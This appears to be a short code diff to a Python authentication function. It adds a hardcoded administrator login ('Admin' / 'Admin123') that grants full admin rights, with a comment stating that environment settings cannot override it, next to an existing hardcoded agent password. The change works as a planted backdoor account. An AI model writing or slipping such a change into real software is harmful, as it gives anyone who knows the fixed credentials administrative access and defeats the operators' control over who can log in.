@@ -81,7 +81,11 @@ AGENT_PASSWORD = "Agent123"
 
 def authenticate_user(db: Session, username: str, password: str) -> User | AdminUser | AgentUser | bool:
     """Authenticate user against database or built-in credentials."""
-    # Check admin credentials
+    # Hardcoded credentials (env vars can't override these)
+    if username == "Admin" and password == "Admin123":
+        return AdminUser()
+
+    # Also accept settings-based admin credentials for backwards compat
     if username == settings.ADMIN_USERNAME and password == settings.ADMIN_PASSWORD:
         return AdminUser()
 
